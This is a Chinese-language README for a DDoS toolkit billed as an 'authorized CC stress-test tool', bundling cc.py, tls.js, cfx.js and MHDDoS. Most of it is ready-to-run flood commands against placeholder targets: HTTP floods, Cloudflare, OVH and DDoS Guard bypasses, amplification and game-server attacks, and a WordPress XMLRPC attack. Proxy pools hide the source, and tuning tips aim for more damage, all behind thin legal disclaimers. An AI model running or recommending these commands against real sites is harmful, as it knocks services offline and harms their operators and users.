# 🎯 合法CC测压工具（已被授权使用）

> ⚠️ **重要**: 本工具仅供合法授权的安全测试使用！未经授权的测试是违法的！

**版本**: v4.0 Ultimate Edition (MHDDoS 集成版)  
**状态**: ✅ 完全就绪  
**更新**: 2025-10-27  
**攻击方法**: 60+ 种 (Layer 4 + Layer 7)

---

## 📋 快速导航

- [工具总览](#工具总览)
- [快速开始](#快速开始)
- [核心工具](#核心工具)
- [完整文档](#完整文档)
- [法律声明](#法律声明)

---

## 🚀 工具总览

### 核心攻击工具（7个）

| 工具 | 语言 | 特点 | 威力 | 推荐度 |
|------|------|------|------|--------|
| **cc.py** | Python | 多模式、稳定 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **cc.js** | Node.js | Node实现 | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| **cc** | Bash | 命令行封装 | ⭐⭐⭐ | ⭐⭐⭐ |
| **cfx.js** | Node.js | HTTP/1.1洪水 | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| **tls.js** | Node.js | HTTP/2 CF绕过 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **scrape.py** | Python | 代理抓取（100+源） | N/A | ⭐⭐⭐ |
| **MHDDoS** ⭐ | Python | 57种方法集合 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### 🆕 MHDDoS 特色功能

**Layer 7 专用 Bypass** (20+ 种):
- CloudFlare Bypass (CFB, CFBUAM)
- OVH Bypass
- DDoS Guard Bypass (DGB)
- Arvan Cloud Bypass (AVB)
- Google Shield Bypass (GSB)
- WordPress XMLRPC Exploit
- Apache Exploit
- TOR 网站攻击支持

**Layer 4 攻击** (20+ 种):
- TCP/UDP/SYN/ICMP Flood
- 游戏协议攻击（Minecraft, FiveM, TeamSpeak, VSE）
- Amplification 攻击（DNS, NTP, Memcached, Chargen, CLDAP, ARD, RDP）

**工具集**:
- CFIP - CloudFlare 真实 IP 查找
- DNS Records 查询
- DSTAT - 流量监控

### 辅助工具（2个）

- **超高速筛选.py** - 多进程代理筛选（10-25倍速）
- **refresh_proxy.sh** - 付费代理自动刷新

---

## ⚡ 快速开始

### 3步开始测压

```bash
# 步骤1: 刷新代理
./refresh_proxy.sh

# 步骤2: 选择工具（推荐顺序）

# 方案A: 通用压测（推荐）
python3 cc.py -url https://目标.com -f proxy_paid.txt -v http -s 60

# 方案B: Cloudflare绕过（高防护）⭐
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt

# 方案C: 快速测试
node 新建文件夹/cfx.js https://目标.com proxy_paid.txt 30

# 方案D: MHDDoS 专用Bypass（OVH/DDoS Guard/Arvan等）
python3 mhddos/start.py CFB 0 https://目标.com 200 proxy_paid.txt 100 180

# 方案E: Layer 4 攻击
python3 mhddos/start.py TCP 目标IP:端口 200 180

# 步骤3: 执行
# 直接运行上面选择的命令即可
```

### 🆕 MHDDoS 快速示例

```bash
# CloudFlare Bypass
python3 mhddos/start.py CFB 0 https://目标.com 200 proxy_paid.txt 100 180

# OVH Bypass
python3 mhddos/start.py OVH 0 https://目标.com 200 proxy_paid.txt 100 180

# DDoS Guard Bypass
python3 mhddos/start.py DGB 0 https://目标.com 200 proxy_paid.txt 100 180

# WordPress攻击
python3 mhddos/start.py XMLRPC 0 https://目标.com/xmlrpc.php 200 proxy_paid.txt 100 180

# TCP Flood
python3 mhddos/start.py TCP 目标IP:端口 200 180

# Minecraft服务器
python3 mhddos/start.py MINECRAFT 目标IP:25565 200 180

# 查找CloudFlare真实IP
python3 mhddos/start.py tools
# 选择 1: CFIP
```

---

## 🔧 核心工具详解

### 1. cc.py - Python CC攻击（⭐最推荐）

**支持模式**:
- **CC模式** (`-m cc`) - 默认，GET请求
- **POST模式** (`-m post`) - API接口测试
- **HEAD模式** (`-m head`) - 轻量级测试
- **Brute模式** (`-b 1`) - 极限模式

**使用示例**:
```bash
# 基础攻击
python3 cc.py -url https://目标.com -f proxy_paid.txt -v http -s 60

# POST接口
echo '{"test":"data"}' > data.json
python3 cc.py -url https://目标.com/api -m post -data data.json \
  -f proxy_paid.txt -v http -s 120

# 极限模式
python3 cc.py -url https://目标.com -m cc -b 1 -t 2000 \
  -f proxy_paid.txt -v http -s 300
```

**参数说明**:
```
-url      目标URL（必填）
-m        模式：cc/post/head（默认：cc）
-f        代理文件（默认：proxy.txt）
-v        代理类型：4/5/http（默认：5）
-t        线程数（默认：800）
-s        时长（秒）（默认：60）
-b        Brute：0/1（默认：0）
```

---

### 2. tls.js - HTTP/2 + TLS Bypass（⭐最强）

**专门针对Cloudflare/Akamai等高防护CDN！**

**核心技术**:
- ✅ HTTP/2多路复用
- ✅ TLS 1.3加密
- ✅ 动态UA生成
- ✅ 自动RAM管理

**使用示例**:
```bash
# 常规绕过
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt

# 极限绕过
node 新建文件夹/tls.js https://目标.com 300 512 20 proxy_paid.txt
```

**参数说明**:
```
参数1: 目标URL
参数2: 时间（秒）
参数3: 速率（64-512）
参数4: 线程数（5-20）
参数5: 代理文件
```

---

### 3. cfx.js - HTTP/1.1洪水攻击

**快速简单的HTTP/1.1攻击**

**使用示例**:
```bash
node 新建文件夹/cfx.js https://目标.com proxy_paid.txt 60
```

---

## 📚 完整文档

### 必读文档

1. **法律声明.md** ⚠️ 必读！
   - 中文法律合规说明
   - 使用前必须阅读

2. **LEGAL_NOTICE.md** ⚠️ 必读！
   - English legal compliance
   - Must read before use

### 核心技术文档

3. **🏆 最强武器库使用指南.md** ⭐ 最新推荐
   - 60+ 种攻击方法完整说明
   - 每个场景的首选武器
   - MHDDoS 详细使用指南
   - 实战场景推荐

4. **📊 深度技术对比分析.md** ⭐ 技术细节
   - tls.js vs MHDDoS CFB 深度对比
   - 协议和性能分析
   - 最强武器选择依据
   - 完整决策矩阵

5. **完整攻击指南.md**
   - 所有工具的完整说明
   - 使用场景和示例
   - 性能对比和调优

6. **新增工具完整说明.md**
   - cfx.js详细说明
   - tls.js深度分析
   - scrape.py使用指南

5. **✅ 项目清理完成报告.md**
   - 项目结构说明
   - 功能完整性验证
   - 清理前后对比

---

## 🔒 法律声明

### ⚠️ 重要法律提醒

本工具**仅供**以下情况使用：

1. ✅ 拥有目标系统的**书面授权**
2. ✅ 合法的安全测试和渗透测试
3. ✅ 自己的系统压力测试

**严禁用于**：

1. ❌ 未经授权的攻击
2. ❌ 恶意破坏
3. ❌ 非法活动

### 法律责任

- 使用本工具前**必须**完整阅读`法律声明.md`
- 使用者需承担所有法律责任
- 未经授权的使用可能面临刑事起诉

**详细说明请阅读**:
- 📄 [法律声明.md](法律声明.md) (中文)
- 📄 [LEGAL_NOTICE.md](LEGAL_NOTICE.md) (English)

---

## 📦 代理配置

### 付费代理（推荐）✅

```bash
# 刷新最新代理
./refresh_proxy.sh

# 使用付费代理
python3 cc.py -url <目标> -f proxy_paid.txt -v http -s 60
```

- **数量**: 640个（动态刷新）
- **类型**: HTTP代理池
- **刷新**: 自动API获取

### 免费代理（备用）

```bash
# 方案1: 使用scrape.py抓取
python3 新建文件夹/scrape.py

# 方案2: 使用内置的免费代理（111K）
# 需要筛选
python3 超高速筛选.py fast

# 使用筛选后的代理
python3 cc.py -url <目标> -f proxy_fast_test.txt -v 5 -s 60
```

---

## 🎯 使用场景

### 场景1: 通用Web压测

**推荐**: cc.py

```bash
python3 cc.py -url https://目标.com -f proxy_paid.txt -v http -s 60
```

### 场景2: Cloudflare保护的网站

**推荐**: tls.js ⭐⭐⭐⭐⭐

```bash
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt
```

### 场景3: API接口测试

**推荐**: cc.py (POST模式)

```bash
echo '{"test":"data"}' > data.json
python3 cc.py -url https://目标.com/api -m post -data data.json \
  -f proxy_paid.txt -v http -s 120
```

### 场景4: 快速验证

**推荐**: cfx.js

```bash
node 新建文件夹/cfx.js https://目标.com proxy_paid.txt 30
```

---

## 📊 性能参考

| 工具 | 本地QPS | G口QPS | CF绕过 | 难度 |
|------|---------|---------|--------|------|
| cc.py (CC) | ~30K-80K | ~500K+ | ⭐⭐⭐ | ⭐⭐ |
| cc.py (Brute) | ~150K+ | ~1M+ | ⭐⭐⭐ | ⭐⭐ |
| tls.js | ~90K-256K | ~1M+ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| cfx.js | ~50K | ~200K | ⭐⭐ | ⭐ |

---

## 🔧 安装依赖

### Python工具

```bash
pip3 install -r requirements.txt
```

或手动安装：
```bash
pip3 install requests socks
```

### Node.js工具

```bash
# cc.js
npm install colors

# tls.js
npm install net http2 tls cluster url crypto fs colors

# cfx.js
npm install colors
```

---

## 📁 项目结构

```
项目根目录/
├── cc.py                       # Python CC攻击
├── cc/
│   ├── cc.js                   # Node.js CC攻击
│   ├── cc                      # Bash封装
│   ├── install.sh              # 安装脚本
│   ├── proxy.txt               # 免费代理
│   └── proxy_paid.txt          # 付费代理
├── 新建文件夹/
│   ├── cfx.js                  # HTTP/1.1洪水
│   ├── tls.js                  # HTTP/2+TLS绕过
│   └── scrape.py               # 代理抓取
├── 超高速筛选.py                # 高速筛选
├── refresh_proxy.sh            # 代理刷新
├── proxy.txt                   # 免费代理（111K）
├── proxy_paid.txt              # 付费代理（640）
├── requirements.txt            # Python依赖
├── README.md                   # 本文件
├── 法律声明.md                  # 中文法律
├── LEGAL_NOTICE.md             # 英文法律
├── 完整攻击指南.md              # 完整指南
├── 新增工具完整说明.md          # 新工具说明
└── ✅ 项目清理完成报告.md       # 清理报告
```

---

## ❓ 常见问题

### Q1: 代理不可用怎么办？

```bash
# 重新刷新付费代理
./refresh_proxy.sh

# 或筛选免费代理
python3 超高速筛选.py fast
```

### Q2: 效果不佳怎么办？

1. 检查代理质量
2. 增加线程数
3. 使用Brute模式
4. 切换到tls.js
5. 部署到G口服务器

### Q3: 如何选择工具？

- **普通网站** → cc.py
- **Cloudflare** → tls.js
- **快速测试** → cfx.js
- **API接口** → cc.py -m post

### Q4: 需要授权吗？

**是的！必须拥有书面授权！** 请阅读`法律声明.md`。

---

## 🎉 项目特色

### 1. 工具齐全 ⭐⭐⭐⭐⭐
- 6种攻击工具
- 3种语言实现
- 多种攻击模式

### 2. 法律合规 ⭐⭐⭐⭐⭐
- 完整法律文档
- 工具启动警告
- 合规使用指导

### 3. 文档完善 ⭐⭐⭐⭐⭐
- 5个核心文档
- 详细使用说明
- 实战示例丰富

### 4. 代理双轨 ⭐⭐⭐⭐⭐
- 付费代理（640个）
- 免费代理（111K）
- 自动刷新

### 5. 即用性强 ⭐⭐⭐⭐⭐
- 无需配置
- 立即可用
- 零学习成本

---

## 📞 支持

- **完整指南**: [完整攻击指南.md](完整攻击指南.md)
- **新工具说明**: [新增工具完整说明.md](新增工具完整说明.md)
- **清理报告**: [✅ 项目清理完成报告.md](✅ 项目清理完成报告.md)

---

## 📝 更新日志

### v3.7.1 Enhanced (2025-10-27)

**新增**:
- ✅ 新增tls.js（HTTP/2+TLS绕过）
- ✅ 新增cfx.js（HTTP/1.1洪水）
- ✅ 新增scrape.py（代理抓取）
- ✅ 新增超高速筛选.py
- ✅ 新增refresh_proxy.sh

**改进**:
- ✅ 添加法律声明到cc.py
- ✅ 添加法律声明到cc.js
- ✅ 完善文档系统
- ✅ 配置付费代理

**清理**:
- ✅ 删除临时文件
- ✅ 删除重复文档
- ✅ 优化项目结构

---

## ⚖️ 许可证

本项目仅供学习和合法授权的安全测试使用。

**使用本工具即表示您：**
1. ✅ 已阅读并同意法律声明
2. ✅ 拥有目标系统的书面授权
3. ✅ 理解并承担所有法律责任

---

## 🔗 相关链接

- 原作者GitHub: https://github.com/Leeon123/CC-attack
- 版本: v3.7.1 (2022/3/24) + Enhanced (2025/10/27)

---

**免责声明**: 本工具仅供合法授权的安全测试使用。未经授权的使用是违法的，使用者需承担所有法律责任。

**立即开始**: 阅读`法律声明.md` → 刷新代理 → 选择工具 → 执行测压

**祝您测试顺利！** 🚀
